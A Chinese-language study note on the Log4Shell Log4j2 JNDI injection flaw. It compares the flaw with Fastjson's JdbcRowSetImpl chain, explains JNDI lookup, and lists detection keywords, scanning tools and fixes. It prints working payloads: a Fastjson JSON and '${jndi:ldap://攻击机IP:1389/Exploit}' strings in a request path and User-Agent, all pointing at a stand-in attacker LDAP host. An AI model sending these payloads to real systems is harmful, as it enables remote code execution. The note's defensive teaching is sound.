# log4j漏洞

Log4j2 的 JNDI 注入漏洞（Log4Shell）是 2021 年爆发的严重安全漏洞，影响版本为 `2.0-beta9` 到 `2.14.1`。攻击者可以通过构造恶意的日志消息，利用 JNDI 查找功能远程加载恶意类，实现远程代码执行。

**漏洞核心**：Log4j2 支持在日志中解析 `${}` 表达式，其中 `jndi` 协议会触发 JNDI 查找，导致可以加载远程恶意对象。

## 对比

我们之前讲到了fastjson漏洞，log4j同样利用了jndi，来看看区别：

### Fastjson 利用链

```
// 1. 先准备一个 HTTP 服务器托管恶意类 Exploit.class
// 2. 用 Marshalsec 启动 LDAP 服务（见上节）
// 3. 发送恶意 JSON

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://攻击机:1389/Exploit",
    "autoCommit": true
}
```

**触发链**：`JSON.parse()` → `JdbcRowSetImpl.setAutoCommit()` → `connect()` → `InitialContext.lookup()` 

#### Log4j 利用链

```
// 1. 同样准备 HTTP 服务器和 Marshalsec 服务
// 2. 让目标记录日志

logger.error("${jndi:ldap://攻击机:1389/Exploit}");
```

**触发链**：`logger.error()` → 解析 `${}` → `JndiLookup.lookup()` → `InitialContext.lookup()` 

可以看到，**Fastjson 需要经过一系列方法调用才到达 JNDI lookup，而 Log4j 直接就从表达式到 JNDI lookup**。

## 概念

### JNDI

是一种命名服务，让你通过**名字**找到**对象**，不用关心对象存在哪里LDAP/RMI/DNS。

其中有两种核心方法

**1、先去公布资源 --bind方法**

**2、然后别人可以用名字查找资源 --lookup方法**

log4j 即为在日志字符串里写 `lookup()` 的参数，导致可以去恶意服务器拉取对象。

#### 漏洞入口：

```
public class JndiLookup implements StrLookup {
    
    @Override
    public String lookup(String key) {
        // key = "ldap://127.0.0.1:7912/test"
        if (key == null) {
            return null;
        }
        
        // 关键：直接执行 JNDI 查询
        try {
            Context ctx = new InitialContext();
            // lookup 方法会触发远程类加载
            Object obj = ctx.lookup(key);
            return obj != null ? obj.toString() : null;
        } catch (NamingException e) {
            // 异常处理...
        }
    }
}
```

服务端 ：LDAPSeriServer.java，作用等价于marshalsec

客户端 ：JNDIClient.java 

## 漏洞复现过程：

![c6e047cf-2b5e-46b6-9202-80486e0a05d8](/photo/c6e047cf-2b5e-46b6-9202-80486e0a05d8.png)

攻击者需要在远程准备

1.ldap服务器（http url）

2.远程代码exploit

3.攻击载荷

```
 GET /api/search?q=${jndi:ldap://攻击机IP:1389/Exploit}         │
User-Agent: ${jndi:ldap://攻击机IP:1389/Exploit}  
```

![log4j](/photo/log4j.png)

## 漏洞排查方法

### pom版本检查

### 日志

1.是否存在“jndi:ldap://”、“jndi:rmi” "dnslog.cn" "ceye.io"等

2.是否存在JndiLookup、ldapURLContext、getObjectFactoryFromReference调用

### 工具

1.https://static.threatbook.cn/tools/log4j

2.local-check.sh

3.https://sca.seczone.cn/allScanner.zip

### 漏洞修复

#### 思路

1、禁止用户请求参数出现攻击关键字 

2、禁止lookup下载远程文件（命名引用）

3、禁止log4j的应用连接外网

4、禁止log4j使用lookup

5、从log4j jar包中中删除lookup 2.10以下



#### 升级到2.17.1 

原理

1、默认不再支持二次跳转（也就是命名引用）的方式获取对象

2、只有在log4j2.allowedLdapClasses列表中指定的class才能获取。

3、只有远程地址是本地地址或者在log4j2.

llowedLdapHosts列表中指定的地址才能获取

其他方案

升级JDK

JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前

JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全

性。

JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

修改log4j配置

1、设置参数 

log4j2.formatMsgNoLookups=True

2、修改JVM参数 

-Dlog4j2.formatMsgNoLookups=true

3、系统环境变量

FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true

4、禁止 log4j2 所在服务器外连